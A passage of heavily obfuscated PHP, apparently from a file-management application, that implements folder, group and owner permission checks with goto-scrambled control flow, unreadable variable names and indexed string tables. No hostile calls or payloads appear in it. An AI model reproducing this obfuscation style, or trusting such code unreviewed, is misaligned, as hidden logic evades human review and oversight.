FŞÜõµçãÜ; dœÇÇÚ˜Ãß: if (!$A­óàÍ¯õ && count($C¸‡ãÅ£ì) == 1) { $A­óàÍ¯õ = array(); $A­óàÍ¯õ[$C¸‡ãÅ£ì[0]] = $cí£Ë“ô™->sourceInfo($C¸‡ãÅ£ì[0]); } if (!$A­óàÍ¯õ) { $c†¡‹æÁº˜ = array($Cªºˆ¶ğÊ›[399] => array($Cªºˆ¶ğÊ›[400], $C¸‡ãÅ£ì)); $A­óàÍ¯õ = $cí£Ë“ô™->field($Cªºˆ¶ğÊ›[1820])->where($c†¡‹æÁº˜)->select(); $A­óàÍ¯õ = array_to_keyvalue($A­óàÍ¯õ, $Cªºˆ¶ğÊ›[385]); } $F„¾¶’ƒÜè = $C¸‡ãÅ£ì; goto c‹Ç§ê­ê›; FŞÜõµçãÜ: } public function authDeepCheck($CÓÎô¨É‚õ, $fäØÖ‰¨ÕŸ = false) { goto C¤ñ¥‡ˆø®; dåŸ›² ¦æ: if (!in_array($CÓÎô¨É‚õ, $d„Š¨ì¸‰‘[$eŠ¼—Ã‘µå[1825]])) { return !1; } $D£ÙõÔâÛ = array(); foreach ($d„Š¨ì¸‰‘[$eŠ¼—Ã‘µå[1826]] as $c ”¡æˆàÈ => $EÑéÓ¸ËĞ) { if (!in_array($CÓÎô¨É‚õ, $EÑéÓ¸ËĞ)) { continue; } $D£ÙõÔâÛ[] = $c ”¡æˆàÈ; } goto DÈ‡®Šš¦¦; DÈ‡®Šš¦¦: $a´ó™È›ä» = $D£ÙõÔâÛ ? $D£ÙõÔâÛ[0] : $CÓÎô¨É‚õ; return array($eŠ¼—Ã‘µå[393] => -1, $eŠ¼—Ã‘µå[434] => array($eŠ¼—Ã‘µå[401] => $eŠ¼—Ã‘µå[1045], $eŠ¼—Ã‘µå[1650] => $eŠ¼—Ã‘µå[485], $eŠ¼—Ã‘µå[402] => LNG($eŠ¼—Ã‘µå[1827]), $eŠ¼—Ã‘µå[1665] => $eŠ¼—Ã‘µå[1828]), $eŠ¼—Ã‘µå[1829] => LNG($eŠ¼—Ã‘µå[1830]), $eŠ¼—Ã‘µå[1831] => $this->sourceAuthInfo($a´ó™È›ä»)); goto aéİà¹‹‹ª; C¤ñ¥‡ˆø®: $eŠ¼—Ã‘µå =& $_SERVER[úÎü]; $fäØÖ‰¨ÕŸ = $fäØÖ‰¨ÕŸ ? $fäØÖ‰¨ÕŸ : USER_ID; $d„Š¨ì¸‰‘ = $this->makeAuthDeep($fäØÖ‰¨ÕŸ); goto dåŸ›² ¦æ; aéİà¹‹‹ª: } protected function makeAuthDeep($BÈ¿¤àø° = false) { goto CÎ‘†ëª«; D›¯İ¶µ‘¾: foreach ($Aƒ±¦µíŒÁ as $dÌê„ô™ °) { $bè„¬Æ’½¾ = $fÃ‡Ï¿–´â->getInfo($dÌê„ô™ °); $d¼óğ¸ë³¾[] = $bè„¬Æ’½¾[$Dˆ¡†Ù®³Â[407]][$Dˆ¡†Ù®³Â[385]]; $fÂì‘‰õà[$dÌê„ô™ °] = $bè„¬Æ’½¾[$Dˆ¡†Ù®³Â[407]][$Dˆ¡†Ù®³Â[385]]; $D÷Â‡«·Œ¬[$dÌê„ô™ °] = $BÂí±Û¦ôè->parentLevelArray($bè„¬Æ’½¾[$Dˆ¡†Ù®³Â[476]]); } foreach ($D¼“·ÛõÍĞ as $FİÈ¥‹¼ï· => $Aº›óù§‰ï) { $dŒçŞŒæ¶à = $f™´°²æª…[$FİÈ¥‹¼ï·]; if (!$dŒçŞŒæ¶à || !$fÂì‘‰õà[$dŒçŞŒæ¶à]) { continue; } $fÇ‹„¹á’’ = array(); foreach ($D÷Â‡«·Œ¬[$dŒçŞŒæ¶à] as $dÌê„ô™ °) { $fÇ‹„¹á’’[] = $fÂì‘‰õà[$dÌê„ô™ °]; } $D¼“·ÛõÍĞ[$FİÈ¥‹¼ï·] = array_merge($fÇ‹„¹á’’, $Aº›óù§‰ï); } $d¼óğ¸ë³¾ = array_values(array_unique($d¼óğ¸ë³¾)); goto d›É—Èä±¦; cØ‚¤æ±”º: $Aƒ±¦µíŒÁ = $cßôì²‘±®; $BÂí±Û¦ôè = Model($Dˆ¡†Ù®³Â[1162]); $fÃ‡Ï¿–´â = Model($Dˆ¡†Ù®³Â[475]); goto C‹ÅÚœ³Ûó; d›É—Èä±¦: $D’æàæËÔ† = array($Dˆ¡†Ù®³Â[1825] => $d¼óğ¸ë³¾, $Dˆ¡†Ù®³Â[1826] => $D¼“·ÛõÍĞ); $eƒ¿Õ¸Ó„[$BÈ¿¤àø°] = $D’æàæËÔ†; return $D’æàæËÔ†; goto b¨Èö†ùéÉ; cñÑ¯ ­›ô: if ($cßôì²‘±®) { $f¨¤èƒÎÖ½ = array(array($Dˆ¡†Ù®³Â[387] => SourceModel::TYPE_USER, $Dˆ¡†Ù®³Â[473] => $BÈ¿¤àø°), array($Dˆ¡†Ù®³Â[387] => SourceModel::TYPE_GROUP, $Dˆ¡†Ù®³Â[473] => array($Dˆ¡†Ù®³Â[400], $cßôì²‘±®)), $Dˆ¡†Ù®³Â[918] => $Dˆ¡†Ù®³Â[1733]); } $eğ••·õ¬ = $this->field($Dˆ¡†Ù®³Â[1833])->where($f¨¤èƒÎÖ½)->select(); $B”„ÆÚ”Ÿ = array(); goto E‡œ´Û¹†; CÎ‘†ëª«: $Dˆ¡†Ù®³Â =& $_SERVER[úÎü]; static $eƒ¿Õ¸Ó„ = array(); $BÈ¿¤àø° = $BÈ¿¤àø° ? $BÈ¿¤àø° : USER_ID; goto cÅÑ´¦°îó; E‡œ´Û¹†: $cù©Ãù½÷ç = array_to_keyvalue_group($eğ••·õ¬, $Dˆ¡†Ù®³Â[385]); foreach ($cù©Ãù½÷ç as $aïâŠ™”¯‘ => $d… ˆÍ¿á†) { $a˜‚Ä°Ì‡ = $this->authArrayCheck($d… ˆÍ¿á†, $BÈ¿¤àø°); if ($a˜‚Ä°Ì‡[$Dˆ¡†Ù®³Â[393]] > 0) { $B”„ÆÚ”Ÿ[] = $aïâŠ™”¯‘ . $Dˆ¡†Ù®³Â[33]; } } $d¼óğ¸ë³¾ = array(); goto cØ‚¤æ±”º; cÅÑ´¦°îó: if (isset($eƒ¿Õ¸Ó„[$BÈ¿¤àø°])) { return $eƒ¿Õ¸Ó„[$BÈ¿¤àø°]; } $aïŞÏË¿Œª = Model($Dˆ¡†Ù®³Â[1832])->listData(); $BâÁİ–„ = array(); goto bá¬ÆŒ“Ëí; e¶¸¦ˆ–‘Ë: $D÷Â‡«·Œ¬ = array(); if ($B”„ÆÚ”Ÿ) { $D³‚ÂÉ¸Ò = $BÂí±Û¦ôè->where(array($Dˆ¡†Ù®³Â[385] => array($Dˆ¡†Ù®³Â[400], $B”„ÆÚ”Ÿ)))->select(); foreach ($D³‚ÂÉ¸Ò as $e‚¨¬¨ğÙÛ) { $a®”±‚Öî¦ = $BÂí±Û¦ôè->parentLevelArray($e‚¨¬¨ğÙÛ[$Dˆ¡†Ù®³Â[476]]); $d¼óğ¸ë³¾ = array_merge($d¼óğ¸ë³¾, $a®”±‚Öî¦); $Aƒ±¦µíŒÁ[] = $e‚¨¬¨ğÙÛ[$Dˆ¡†Ù®³Â[473]]; $D¼“·ÛõÍĞ[$e‚¨¬¨ğÙÛ[$Dˆ¡†Ù®³Â[385]]] = $a®”±‚Öî¦; $f™´°²æª…[$e‚¨¬¨ğÙÛ[$Dˆ¡†Ù®³Â[385]]] = $e‚¨¬¨ğÙÛ[$Dˆ¡†Ù®³Â[473]]; } } $Aƒ±¦µíŒÁ = array_values(array_unique($Aƒ±¦µíŒÁ)); goto a†§±ÑßÙ„; bá¬ÆŒ“Ëí: foreach ($aïŞÏË¿Œª as $cêóŸô§â) { if ($cêóŸô§â[$Dˆ¡†Ù®³Â[392]] == 0 && $cêóŸô§â[$Dˆ¡†Ù®³Â[1666]] == $Dˆ¡†Ù®³Â[83]) { $BâÁİ–„[] = $cêóŸô§â[$Dˆ¡†Ù®³Â[383]]; } } $cßôì²‘±® = $this->userGroupParents($BÈ¿¤àø°); $f¨¤èƒÎÖ½ = array($Dˆ¡†Ù®³Â[387] => SourceModel::TYPE_USER, $Dˆ¡†Ù®³Â[473] => $BÈ¿¤àø°); goto cñÑ¯ ­›ô; a†§±ÑßÙ„: $BàäÈ»Ù¼ = $Aƒ±¦µíŒÁ; foreach ($BàäÈ»Ù¼ as $dÌê„ô™ °) { $bè„¬Æ’½¾ = $fÃ‡Ï¿–´â->getInfo($dÌê„ô™ °); $a®”±‚Öî¦ = $BÂí±Û¦ôè->parentLevelArray($bè„¬Æ’½¾[$Dˆ¡†Ù®³Â[476]]); $Aƒ±¦µíŒÁ = array_merge($Aƒ±¦µíŒÁ, $a®”±‚Öî¦); } $Aƒ±¦µíŒÁ = array_values(array_unique($Aƒ±¦µíŒÁ)); goto D›¯İ¶µ‘¾; C‹ÅÚœ³Ûó: $D¼“·ÛõÍĞ = array(); $f™´°²æª… = array(); $fÂì‘‰õà = array(); goto e¶¸¦ˆ–‘Ë; b¨Èö†ùéÉ: } private function makeSourceAuth($cÒÌ®Ü‰’, $D˜’ÍÜ¡‘µ, $fÊ‡ÔÁ“¤ = false) { goto FàÃ³ãÚíÓ; FàÃ³ãÚíÓ: $EÜ¼„´ª½ =& $_SERVER[úÎü]; $D®ğ—áî‡ = $EÜ¼„´ª½[83]; $EñÎš‹¯† = $cÒÌ®Ü‰’[$EÜ¼„´ª½[473]]; goto EÀ”Á¶¯¯®; EÀ”Á¶¯¯®: $bëŒ¬•ã‡’ = $cÒÌ®Ü‰’[$EÜ¼„´ª½[387]] == SourceModel::TYPE_GROUP; $Eç²ôÈËéÒ = $bëŒ¬•ã‡’ ? $this->groupRootAuth($EñÎš‹¯†, $fÊ‡ÔÁ“¤) : !1; if ($Eç²ôÈËéÒ && Model($EÜ¼„´ª½[1813])->authCheckAction($Eç²ôÈËéÒ[$EÜ¼„´ª½[392]], $EÜ¼„´ª½[1664])) { return $this->groupAuthInfo($Eç²ôÈËéÒ, $EñÎš‹¯†); } goto E¸”Üï é; eøÏ•²ÃÃö: foreach ($b³ğÔÛ‘ as $cé†¸Âáô×) { if (!isset($D˜’ÍÜ¡‘µ[$cé†¸Âáô×])) { continue; } $bÑòå£í‚Ö = $this->authMake($D˜’ÍÜ¡‘µ[$cé†¸Âáô×], $fÊ‡ÔÁ“¤); if ($bÑòå£í‚Ö[$EÜ¼„´ª½[434]]) { $a¬ÏÒáÀ¶ = $bÑòå£í‚Ö; break; } } if (!$bëŒ¬•ã‡’) { return $a¬ÏÒáÀ¶; } if (!$a¬ÏÒáÀ¶ && $Eç²ôÈËéÒ) { $a¬ÏÒáÀ¶ = $this->groupAuthInfo($Eç²ôÈËéÒ, $EñÎš‹¯†); } goto Fæç†¸Ÿì»; E¸”Üï é: $b³ğÔÛ‘ = Model($EÜ¼„´ª½[1162])->parentLevelArray($cÒÌ®Ü‰’[$EÜ¼„´ª½[476]]); $b³ğÔÛ‘ = array_merge(array($cÒÌ®Ü‰’[$EÜ¼„´ª½[385]]), array_reverse($b³ğÔÛ‘)); $a¬ÏÒáÀ¶ = !1; goto eøÏ•²ÃÃö; Fæç†¸Ÿì»: if (!$a¬ÏÒáÀ¶) { $EÈñ“íğİ° = Model($EÜ¼„´ª½[475])->getInfo($EñÎš‹¯†); $e¼éÅ®«ë‹ = explode($EÜ¼„´ª½[47], trim($EÈñ“íğİ°[$EÜ¼„´ª½[476]], $EÜ¼„´ª½[47])); foreach ($e¼éÅ®«ë‹ as $d¥¼îá­É) { if ($d¥¼îá­É == $EÜ¼„´ª½[485] || $d¥¼îá­É == $D®ğ—áî‡) { continue; } $EÄç¡­Ùò¨ = $this->groupRootAuth($d¥¼îá­É, $fÊ‡ÔÁ“¤); if (!$EÄç¡­Ùò¨) { continue; } $a¬ÏÒáÀ¶ = $this->groupAuthInfo($EÄç¡­Ùò¨, $d¥¼îá­É); break; } } if (!$a¬ÏÒáÀ¶ || $a¬ÏÒáÀ¶[$EÜ¼„´ª½[393]] <= 0) { $fËÜ´ÙÕ = $this->authDeepCheck($cÒÌ®Ü‰’[$EÜ¼„´ª½[385]], $fÊ‡ÔÁ“¤); if ($fËÜ´ÙÕ) { $a¬ÏÒáÀ¶ = $fËÜ´ÙÕ; } } return $a¬ÏÒáÀ¶; goto C±áïäâ…å; C±áïäâ…å: } private function userIsRoot($EÉì…Í¾è• = false) { $cÄô½ììã‰ =& $_SERVER[úÎü]; if (!$EÉì…Í¾è• && _get($GLOBALS, $cÄô½ììã‰[474])) { return !0; } $aò‹‹¥Öôœ = Model($cÄô½ììã‰[494])->getInfo($EÉì…Í¾è•); $fùƒõÏÓĞ = Model($cÄô½ììã‰[1834])->listData($aò‹‹¥Öôœ[$cÄô½ììã‰[1366]]); if ($fùƒõÏÓĞ && $fùƒõÏÓĞ[$cÄô½ììã‰[1238]][$cÄô½ììã‰[1835]] == 1) { return !0; } return !1; } private function sourceAuthInfo($a¨ìÃ¤·«) { goto DâÌ© ¤³í; DâÌ© ¤³í: $FÄÊÓº»‚ =& $_SERVER[úÎü]; $D™µÉÓöŞ = Model($FÄÊÓº»‚[1162]); $Cé²»º»ôë = $D™µÉÓöŞ->sourceInfo($a¨ìÃ¤·«); goto b°ƒù‡‰½‰; b°ƒù‡‰½‰: if (!$Cé²»º»ôë) { return !1; } $D™µÉÓöŞ->groupPathDisplay($Cé²»º»ôë); $Dâß­¸¾“š = array($Cé²»º»ôë); goto dï¹óÉ†Š³; dï¹óÉ†Š³: $Dâß­¸¾“š = $D™µÉÓöŞ->_listAppendPath($Dâß­¸¾“š); $Cé²»º»ôë = $Dâß­¸¾“š[0]; $fùâ¦Á¤È = $Cé²»º»ôë[$FÄÊÓº»‚[483]]; goto cç¹Ó¼ùõª; cç¹Ó¼ùõª: if (isset($Cé²»º»ôë[$FÄÊÓº»‚[481]])) { $eğƒŸá™Ç = explode($FÄÊÓº»‚[8], trim($Cé²»º»ôë[$FÄÊÓº»‚[483]], $FÄÊÓº»‚[8])); array_shift($eğƒŸá™Ç); $fùâ¦Á¤È = $Cé²»º»ôë[$FÄÊÓº»‚[479]] . $FÄÊÓº»‚[1836] . implode($FÄÊÓº»‚[8], $eğƒŸá™Ç); } return array($FÄÊÓº»‚[402] => $Cé²»º»ôë[$FÄÊÓº»‚[28]], $FÄÊÓº»‚[75] => KodIO::make($Cé²»º»ôë[$FÄÊÓº»‚[385]]), $FÄÊÓº»‚[1837] => $fùâ¦Á¤È); goto c™°ƒÓé­; c™°ƒÓé­: } private function groupAuthInfo($cõ«×§µ†, $d²ä·Ù›ËØ) { $b„ÁÍÉŸ¿· =& $_SERVER[úÎü]; $f¹ºæáİ°Í = Model($b„ÁÍÉŸ¿·[475])->getInfo($d²ä·Ù›ËØ); return array($b„ÁÍÉŸ¿·[1838] => intval($cõ«×§µ†[$b„ÁÍÉŸ¿·[392]]), $b„ÁÍÉŸ¿·[1822] => $cõ«×§µ†, $b„ÁÍÉŸ¿·[1839] => LNG($b„ÁÍÉŸ¿·[1840]), $b„ÁÍÉŸ¿·[1831] => array($b„ÁÍÉŸ¿·[402] => $f¹ºæáİ°Í[$b„ÁÍÉŸ¿·[28]], $b„ÁÍÉŸ¿·[75] => KodIO::make($f¹ºæáİ°Í[$b„ÁÍÉŸ¿·[407]][$b„ÁÍÉŸ¿·[385]]), $b„ÁÍÉŸ¿·[1837] => $f¹ºæáİ°Í[$b„ÁÍÉŸ¿·[480]])); } protected function groupRootAuth($Eƒá£óã‹ä, $B²¡áÉù = false) { goto f²„ï‹Ø¹; c—ŒŒíÙ‡¹: $E¢Ÿôè±“¥ = $this->userGroupList($B²¡áÉù); $e‡¼À³Â‹Á = isset($E¢Ÿôè±“¥[$Eƒá£óã‹ä]) ? $E¢Ÿôè±“¥[$Eƒá£óã‹ä][$fñÂæ‡ç„[392]] : !1; if ($e‡¼À³Â‹Á && Model($fñÂæ‡ç„[1813])->authCheckAction($e‡¼À³Â‹Á[$fñÂæ‡ç„[392]], $fñÂæ‡ç„[1664])) { $d¶ìã†º Ó[$b„’„¬İĞ] = $e‡¼À³Â‹Á; return $e‡¼À³Â‹Á; } goto Fš¾«Ì¸ô•; f²„ï‹Ø¹: $fñÂæ‡ç„ =& $_SERVER[úÎü]; $B²¡áÉù = $B²¡áÉù ? $B²¡áÉù : USER_ID; $b„’„¬İĞ = $B²¡áÉù . $fñÂæ‡ç„[1841] . $Eƒá£óã‹ä; goto bò©ä†•âÆ; Fš¾«Ì¸ô•: $CëèÁã¥ = array($fñÂæ‡ç„[385] => $c–¥ ÏÊŒ¼[$fñÂæ‡ç„[407]][$fñÂæ‡ç„[385]]); $B”à —¬Ğ½ = $fñÂæ‡ç„[1821]; $DÏŞË»ç = $this->field($B”à —¬Ğ½)->cacheMemory()->where($CëèÁã¥)->select(); goto b„Ğ«£ì; b„Ğ«£ì: $eÈ†Ğ™ªªÖ = $DÏŞË»ç ? $this->authMake($DÏŞË»ç, $B²¡áÉù) : !1; $C¯ˆ«õİÔÆ = $eÈ†Ğ™ªªÖ ? $eÈ†Ğ™ªªÖ[$fñÂæ‡ç„[434]] : !1; $d¶ìã†º Ó[$b„’„¬İĞ] = $C¯ˆ«õİÔÆ ? $C¯ˆ«õİÔÆ : $e‡¼À³Â‹Á; goto FÜÂŸƒ•³™; bò©ä†•âÆ: static $d¶ìã†º Ó = array(); if (isset($d¶ìã†º Ó[$b„’„¬İĞ])) { return $d¶ìã†º Ó[$b„’„¬İĞ]; } $c–¥ ÏÊŒ¼ = Model($fñÂæ‡ç„[475])->getInfo($Eƒá£óã‹ä); goto c—ŒŒíÙ‡¹; FÜÂŸƒ•³™: return $d¶ìã†º Ó[$b„’„¬İĞ]; goto bæëŸë¹È; bæëŸë¹È: } public function authOwnerApply($E®õ¥¼Ñ­È) { goto cêé…Åø¶Ë; cÒæ±”Œ¨: if (count($BµÃ—–ÆÛ) == 0) { $BµÃ—–ÆÛ = $this->authFolderOwnerGroup($E®õ¥¼Ñ­È[$dÈ±šĞÙ[473]]); } $BµÃ—–ÆÛ = array_unique($BµÃ—–ÆÛ); if (AuthModel::authCheckRoot($E®õ¥¼Ñ­È[$dÈ±šĞÙ[392]][$dÈ±šĞÙ[393]])) { $BµÃ—–ÆÛ[] = USER_ID; } goto AôÎÊÜÄØ; a¶Â±ÜøÏ: $f†‡•‰õô› = array($dÈ±šĞÙ[399] => array($dÈ±šĞÙ[400], $aâá‡®ˆ³)); $B²šòô¤± = $this->field($Dëì²À÷¸)->where($f†‡•‰õô›)->select(); $B²šòô¤± = array_to_keyvalue_group($B²šòô¤±, $dÈ±šĞÙ[385]); goto DÖ¡Äí»„é; bÕ±ÎÚêÙÃ: $aâá‡®ˆ³ = Model($dÈ±šĞÙ[1162])->parentLevelArray($E®õ¥¼Ñ­È[$dÈ±šĞÙ[476]]); $aâá‡®ˆ³ = array_merge(array($E®õ¥¼Ñ­È[$dÈ±šĞÙ[385]]), array_reverse($aâá‡®ˆ³)); $Dëì²À÷¸ = $dÈ±šĞÙ[1821]; goto a¶Â±ÜøÏ; AôÎÊÜÄØ: $E®õ¥¼Ñ­È[$dÈ±šĞÙ[392]][$dÈ±šĞÙ[1844]] = Model($dÈ±šĞÙ[491])->userListInfo($BµÃ—–ÆÛ); return $E®õ¥¼Ñ­È; goto EóÁŒØ›‰; cêé…Åø¶Ë: $dÈ±šĞÙ =& $_SERVER[úÎü]; if (empty($E®õ¥¼Ñ­È[$dÈ±šĞÙ[392]]) || isset($E®õ¥¼Ñ­È[$dÈ±šĞÙ[1842]]) && $E®õ¥¼Ñ­È[$dÈ±šĞÙ[1842]]) { return $E®õ¥¼Ñ­È; } if (AuthModel::authCheckRoot($E®õ¥¼Ñ­È[$dÈ±šĞÙ[392]][$dÈ±šĞÙ[393]])) { return $E®õ¥¼Ñ­È; } goto bÕ±ÎÚêÙÃ; DÖ¡Äí»„é: $AÌŠ¿‰‚İœ = array(); $BµÃ—–ÆÛ = array(); foreach ($B²šòô¤± as $EåôôÇ¼Ì¡ => $a¾£òˆµì‘) { $d·àßßØ¬÷ = $this->authFolderOwnerUser($a¾£òˆµì‘); $AÌŠ¿‰‚İœ[$EåôôÇ¼Ì¡] = $d·àßßØ¬÷; $BµÃ—–ÆÛ = array_merge($BµÃ—–ÆÛ, $d·àßßØ¬÷[$dÈ±šĞÙ[551]]); if ($d·àßßØ¬÷[$dÈ±šĞÙ[1843]]) { break; } } goto cÒæ±”Œ¨; EóÁŒØ›‰: } private function authFolderOwnerGroup($D‚ºµÅ¯ÀÌ) { $B¬“£ˆÇó =& $_SERVER[úÎü]; $eö’¯Ûá’¿ = Model($B¬“£ˆÇó[1727])->where(array($B¬“£ˆÇó[1644] => $D‚ºµÅ¯ÀÌ))->select(); $D—÷Ó¥Ç = array(); if (!$eö’¯Ûá’¿) { return $D—÷Ó¥Ç; } foreach ($eö’¯Ûá’¿ as $fÇ‘ç¥ÌÇ) { $cø—Ç‰›«ö = $this->authInfo($fÇ‘ç¥ÌÇ); if (AuthModel::authCheckRoot($cø—Ç‰›«ö[$B¬“£ˆÇó[392]])) { $D—÷Ó¥Ç[] = $fÇ‘ç¥ÌÇ[$B¬“£ˆÇó[1485]]; } } return $D—÷Ó¥Ç; } private function authFolderOwnerUser($BÛÛ‡ÙéÎ) { $D†‡ÌÜ– =& $_SERVER[úÎü]; $b®µğøø´ = array(); $b‰ï‹Ş­ÎŸ = !1; foreach ($BÛÛ‡ÙéÎ as $fºë®¥´¼) { $A’²¬é×ùÑ = $this->authInfo($fºë®¥´¼); if ($fºë®¥´¼[$D†‡ÌÜ–[473]] == $D†‡ÌÜ–[485]) { $b‰ï‹Ş­ÎŸ = !0; } if ($fºë®¥´¼[$D†‡ÌÜ–[387]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($A’²¬é×ùÑ[$D†‡ÌÜ–[392]])) { $b®µğøø´[] = $fºë®¥´¼[$D†‡ÌÜ–[473]]; } } } return array($D†‡ÌÜ–[551] => $b®µğøø´, $D†‡ÌÜ–[1843] => $b‰ï‹Ş­ÎŸ); } public function authMake($BÏó‹¼ÉøÕ, $a‚´°¤¤‰— = false) { $bì‹Ú¬· =& $_SERVER[úÎü]; $Fµ¼öõÒÄô = $this->authArrayCheck($BÏó‹¼ÉøÕ, $a‚´°¤¤‰—); if ($Fµ¼öõÒÄô[$bì‹Ú¬·[1845]]) { $Fµ¼öõÒÄô[$bì‹Ú¬·[1845]] = $this->sourceAuthInfo($Fµ¼öõÒÄô[$bì‹Ú¬·[1845]]); } return $Fµ¼öõÒÄô; } public function authArrayCheck($B£¼ƒİËô, $EË³–äïä = false) { goto b‘¤Ö˜·éä; FŸô¬İöË: $CÄÜ†‡Îé = 1000; $c°¢µö…Çƒ = 0; $A³ÈÊ¥¹ = 0; goto Eá‘ß‰¾‚Ç; cğ§ÎÙˆ†¼: $e•È‰·š²¸ = 0; $ağÇ‚İ¹ßî = 0; $bÒï™“‚²‡ = 0; goto Eå‚É¶Šõ£; b‘¤Ö˜·éä: $bÜğ˜ƒÕ =& $_SERVER[úÎü]; if (!$B£¼ƒİËô) { return array($bÜğ˜ƒÕ[393] => 0, $bÜğ˜ƒÕ[434] => !1); } $EË³–äïä = $EË³–äïä ? $EË³–äïä : USER_ID; goto cğ§ÎÙˆ†¼; Eá‘ß‰¾‚Ç: $fÜ¥¯§¾ñó = 0; $cŠàÕœ‹ó× = 0; $AøÎ–Š…Î = array($bÜğ˜ƒÕ[385] => 0); goto aò˜„¥ŸÓ; Eå‚É¶Šõ£: $eç³ôÔŠ¥ = 0; $d©î¸à®™ = 0; $AµÕòùÆ¬‘ = 0; goto FŸô¬İöË; aò˜„¥ŸÓ: foreach ($B£¼ƒİËô as $AøÎ–Š…Î) { $DÇ—ŸÑÄ¶â = $this->authInfo($AøÎ–Š…Î); if (!$DÇ—ŸÑÄ¶â) { continue; } $d…ãÅƒÏí’ = $AøÎ–Š…Î[$bÜğ˜ƒÕ[473]]; $F¹ÚïÂãØ = intval($DÇ—ŸÑÄ¶â[$bÜğ˜ƒÕ[392]]); if ($AøÎ–Š…Î[$bÜğ˜ƒÕ[387]] == SourceModel::TYPE_USER && $d…ãÅƒÏí’ == $EË³–äïä) { $e•È‰·š²¸ = !0; $bÒï™“‚²‡ = $DÇ—ŸÑÄ¶â; $ağÇ‚İ¹ßî = $F¹ÚïÂãØ; } else { if ($AøÎ–Š…Î[$bÜğ˜ƒÕ[387]] == SourceModel::TYPE_GROUP && $this->groupContainUser($d…ãÅƒÏí’, $EË³–äïä)) { $eç³ôÔŠ¥ = !0; $Eš·Š“åğö = $this->groupStepToUserGroup($d…ãÅƒÏí’, $EË³–äïä); if ($Eš·Š“åğö < $CÄÜ†‡Îé) { $CÄÜ†‡Îé = $Eš·Š“åğö; $d©î¸à®™ = $F¹ÚïÂãØ; $AµÕòùÆ¬‘ = $DÇ—ŸÑÄ¶â; $c°¢µö…Çƒ = $d…ãÅƒÏí’; } if ($Eš·Š“åğö == $CÄÜ†‡Îé && $F¹ÚïÂãØ >= $d©î¸à®™) { $d©î¸à®™ = $F¹ÚïÂãØ; $AµÕòùÆ¬‘ = $DÇ—ŸÑÄ¶â; $c°¢µö…Çƒ = $d…ãÅƒÏí’; } } else { if ($d…ãÅƒÏí’ == $bÜğ˜ƒÕ[485]) { $A³ÈÊ¥¹ = !0; $cŠàÕœ‹ó× = $DÇ—ŸÑÄ¶â; $fÜ¥¯§¾ñó = $F¹ÚïÂãØ; } } } } if ($e•È‰·š²¸) { $DœêÓï¤ì‚ = $ağÇ‚İ¹ßî; $DÇ—ŸÑÄ¶â = $bÒï™“‚²‡; $BäéñóÎÏ = LNG($bÜğ˜ƒÕ[1846]); } else { if ($eç³ôÔŠ¥) { $DœêÓï¤ì‚ = $d©î¸à®™; $DÇ—ŸÑÄ¶â = $AµÕòùÆ¬‘; $dÖù†£À = Model($bÜğ˜ƒÕ[475])->getInfo($c°¢µö…Çƒ); $BäéñóÎÏ = $bÜğ˜ƒÕ[157] . $dÖù†£À[$bÜğ˜ƒÕ[480]] . $bÜğ˜ƒÕ[1847] . LNG($bÜğ˜ƒÕ[1848]); } else { if ($A³ÈÊ¥¹) { $DœêÓï¤ì‚ = $fÜ¥¯§¾ñó; $DÇ—ŸÑÄ¶â = $cŠàÕœ‹ó×; $BäéñóÎÏ = LNG($bÜğ˜ƒÕ[1818]); } else { $DœêÓï¤ì‚ = 0; $DÇ—ŸÑÄ¶â = !1; $BäéñóÎÏ = $bÜğ˜ƒÕ[33]; } } } $f†ĞŒ¼öß = array($bÜğ˜ƒÕ[1838] => intval($DœêÓï¤ì‚), $bÜğ˜ƒÕ[1822] => $DÇ—ŸÑÄ¶â, $bÜğ˜ƒÕ[1839] => $BäéñóÎÏ, $bÜğ˜ƒÕ[1831] => $AøÎ–Š…Î[$bÜğ˜ƒÕ[385]]); goto f‰æÏÕè¹; f‰æÏÕè¹: return $f†ĞŒ¼öß; goto e‚ …š†—·; e‚ …š†—·: } private function groupContainUser($AóÛÕ± µµ, $Aô…ó‰›˜ = false) { return in_array($AóÛÕ± µµ, $this->userGroupParents($Aô…ó‰›˜)); } private function groupStepToUserGroup($BŒˆÒ©­ßä, $aØ×¼Î†ÌÆ = false) { goto f›éç¨¨ãƒ; b½îé‚¿Ì: return $f©…¹½ó; goto bÈÈ×¡ì¿É; E´Â‘¬Ú–Ê: $D—å¿Ï×ÀÈ = $GLOBALS[$E÷İŒó‹«¹[6]][$E÷İŒó‹«¹[84]][$E÷İŒó‹«¹[1739]] == 1; $aäË¹ÒÎß = $D—å¿Ï×ÀÈ ? 3 : 2; foreach ($fœ‹À¯Œ„º as $Eâ¢‡Ñ¢¦¦) { if ($Eâ¢‡Ñ¢¦¦[$E÷İŒó‹«¹[1644]] == $BŒˆÒ©­ßä) { return 0; } $a“¹Ò˜¤Ü¢ = explode($E÷İŒó‹«¹[47], trim($Eâ¢‡Ñ¢¦¦[$E÷İŒó‹«¹[476]], $E÷İŒó‹«¹[47])); if ($a“¹Ò˜¤Ü¢[0] == $E÷İŒó‹«¹[485] && count($a“¹Ò˜¤Ü¢) > $aäË¹ÒÎß) { $Açññâà… = array_reverse(array_slice($a“¹Ò˜¤Ü¢, $aäË¹ÒÎß)); $eŠİÄÙêœ‡ = array_search($BŒˆÒ©­ßä, $Açññâà…); if ($eŠİÄÙêœ‡ !== !1 && $eŠİÄÙêœ‡ + 1 <= $f©…¹½ó) { $f©…¹½ó = $eŠİÄÙêœ‡ + 1; } } } goto b½îé‚¿Ì; f›éç¨¨ãƒ: $E÷İŒó‹«¹ =& $_SERVER[úÎü]; $fœ‹À¯Œ„º = $this->userGroupList($aØ×¼Î†ÌÆ); $f©…¹½ó = 1000; goto E´Â‘¬Ú–Ê; bÈÈ×¡ì¿É: } private function userGroupList($CÑ÷Ì¡“äÆ = false) { $DøÊÛ…·½™ =& $_SERVER[úÎü]; static $Cš¦Íùğè² = array(); if (isset($Cš¦Íùğè²[$CÑ÷Ì¡“äÆ])) { return $Cš¦Íùğè²[$CÑ÷Ì¡“äÆ]; } $Fé¥İáğ·´ = Model($DøÊÛ…·½™[494])->getInfo($CÑ÷Ì¡“äÆ); $Cš¦Íùğè²[$CÑ÷Ì¡“äÆ] = array_to_keyvalue($Fé¥İáğ·´[$DøÊÛ…·½™[1819]], $DøÊÛ…·½™[1644]); return $Cš¦Íùğè²[$CÑ÷Ì¡“äÆ]; } public function userGroupParents($E¶‰Ë–­) { goto FÜä§‹›ßŸ; C¾ìƒñÖ•: $b²ØƒÁ×Õæ[$E¶‰Ë–­] = array_unique($B¯Å‘ñˆ); return 